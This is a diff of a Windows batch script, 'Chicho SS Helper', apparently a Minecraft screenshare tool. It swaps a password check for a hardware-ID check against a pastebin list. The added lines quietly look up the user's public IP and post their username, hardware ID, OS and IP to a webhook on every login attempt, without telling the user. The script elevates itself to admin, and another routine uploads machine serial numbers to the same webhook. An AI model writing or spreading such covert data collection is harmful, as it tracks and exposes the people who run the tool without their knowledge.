@@ -3,6 +3,8 @@ title Chicho SS Helper
 if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 
 md %appdata%\ChichoSSHelper
+curl -1 icanhazip.com 1> tmpwanip & cls & set /p ipv4= < tmpwanip & set /p ipv4= < tmpwanip & del /f tmpwanip
+SET chicho_webhook=
 
 :variables
 set g=[92m
@@ -24,46 +26,43 @@ set r2=[101m
 set t=[40m
 
 :check
-cls
-chcp 65001 >nul 
-color 0D
-echo       ███████╗███╗   ██╗████████╗███████╗██████╗     ██████╗ ██╗███╗   ██╗
-echo       ██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗    ██╔══██╗██║████╗  ██║
-echo       █████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝    ██████╔╝██║██╔██╗ ██║
-echo       ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗    ██╔═══╝ ██║██║╚██╗██║
-echo       ███████╗██║ ╚████║   ██║   ███████╗██║  ██║    ██║     ██║██║ ╚████║
-echo       ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═╝     ╚═╝╚═╝  ╚═══╝
-echo.
-echo.
-set "psCommand=powershell -Command "$pword = read-Host 'Password' -AsSecureString ; ^
-    $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
-        [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)""
-for /f "usebackq delims=" %%p in (`%psCommand%`) do set password=%%p
-if %password%== chicho (goto validPin) else (goto invalidPin)
+ping www.google.com -n 1 -w 1000 >nul
+if errorlevel 1 (echo An error has occured. Please connect to internet and try again. & timeout /t 3 >nul & exit /b) else (goto :connected)
 
+:connected
+for /f %%A in ('curl -k -s https://pastebin.com/raw/0aB3jUtj') do set "auth=%%A"
 
-:validPin
+:hwidvars
+for /f "tokens=2 delims==" %%A in ('wmic csproduct get uuid /format:value ^| find "="') do set uuid=%%A
+
+:auth
+set hwid=%uuid%
+if "%auth%"=="%hwid%" (goto :success) else (goto :fail)
+
+:success
 color a
 echo.
 echo %u%[%g%+%u%] %g%Successfully authenticated.
+echo %u%Your HWID: %g%%hwid%
 echo.
 echo %u%Created by: %g%Chicho#7585
 echo %u%Github: %g%https://github.com/Gastxn
 echo %u%Version: %g%1.5
 echo.
-timeout /t 3 >nul & cls & goto menu
+curl -H "Accept: application/json" -H "Content-Type:multipart/form-data" -X POST -F "payload_json={\"content\":\":warning: **Chicho SS Helper LOGIN!** :warning:\n\n:man_pouting: **Username**: %username% \n:computer: **HWID**: %hwid%\n:window: **OS**: %os%\n:detective: **IP**: %ipv4% \"}" %chicho_webhook%
+timeout /t 4 >nul & cls & goto menu
 
-:invalidPin
+:fail
 color 0C
 echo.
-echo %u%[%r%-%u%] %r%Invalid Password.
-echo Add to chicho#7585 to access the password
+echo %hwid% | CLIP
+echo %u%[%r%-%u%] %r%Not Authenticated...
+echo %r%HWID copied to clipboard.
+echo Add to chicho#7585 to access the Chicho SS Helper
+curl -H "Accept: application/json" -H "Content-Type:multipart/form-data" -X POST -F "payload_json={\"content\":\":warning: **Chicho SS Helper LOGIN FAILED!** :warning:\n\n:man_pouting: **Username**: %username% \n:computer: **HWID**: %hwid%\n:window: **OS**: %os%\n:detective: **IP**: %ipv4% \"}" %chicho_webhook%
+rmdir /s /q %appdata%\ChichoSSHelper
 echo.
-timeout /t 3 >nul & cls & goto check
-
-:nocheck
-cls
-goto check
+timeout /t 4 >nul & exit /b
 
 :Presets
 cls
@@ -137,7 +136,6 @@ tasklist /fi "ImageName eq Javaw.exe" /fo csv 2>nul | find /I "Javaw" >nul
 if "%ERRORLEVEL%"=="0" echo                                                 %g%Minecraft found.%white%
 if "%ERRORLEVEL%"=="1" echo                                                 %r%Minecraft not found.%white%
 echo.
-SET chicho_webhook=
 set /p M="%c%Please, choose:%u% "
 if %M%==1 goto Macro
 if %M%==2 goto BlockedSites
@@ -162,7 +160,6 @@ goto menu
 ::Credits Rancio Modified for Chicho
 :hwid
 cd %appdata%\ChichoSSHelper\
-curl -1 icanhazip.com 1> tmpwanip & cls & set /p ipv4= < tmpwanip & set /p ipv4= < tmpwanip & del /f tmpwanip
 
 echo User Name       : %UserName% > %appdata%\ChichoSSHelper\HWID.txt
 echo Computer Name   : %ComputerName% >> %appdata%\ChichoSSHelper\HWID.txt
@@ -178,7 +175,7 @@ Powershell "wmic memorychip get serialnumber" >> %appdata%\ChichoSSHelper\"HWID.
 Powershell "wmic baseboard get serialnumber" >> %appdata%\ChichoSSHelper\"HWID.txt"
 Powershell "wmic cpu get name">>%appdata%\ChichoSSHelper\HWID.txt
 cd "%appdata%\ChichoSSHelper\"
-curl -H "Accept: application/json" -H "Content-Type:multipart/form-data" -X POST -F "file=@HWID.txt" -F "payload_json={\"content\":\":warning: **Chicho SS Helper SECURITY!** :warning:\n\n:man_pouting: **Username**: %username% \n:detective: **IP**: %ipv4%\n:window: **OS**: %os%\n:computer: **Computer Info**: \"}" %chicho_webhook%
+curl -H "Accept: application/json" -H "Content-Type:multipart/form-data" -X POST -F "file=@HWID.txt" -F "payload_json={\"content\":\":warning: **Chicho SS Helper SECURITY!** :warning:\n\n:man_pouting: **Username**: %username% \n:window: **OS**: %os%\n:computer: **Computer Info**: \"}" %chicho_webhook%
 cls
 echo Done.
 pause
